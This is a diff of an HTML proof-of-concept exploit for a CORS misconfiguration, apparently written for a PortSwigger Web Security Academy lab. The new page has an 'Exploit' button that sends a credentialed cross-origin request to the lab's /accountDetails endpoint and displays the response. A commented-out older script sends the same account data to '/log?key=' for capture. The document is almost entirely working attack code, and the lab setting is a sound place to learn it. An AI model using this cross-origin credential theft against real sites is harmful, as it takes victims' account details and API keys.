@@ -1,4 +1,28 @@
-<script>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "0a5d001f0467d4e7c0ac2d6e00a30076.web-security-academy.net/accountDetails", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+
+
+<!-- <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
     req.open('get','0a5d001f0467d4e7c0ac2d6e00a30076.web-security-academy.net/accountDetails',true);
@@ -8,4 +32,4 @@
     function reqListener() {
         location='/log?key='+this.responseText;
     };
-</script>
+</script> -->
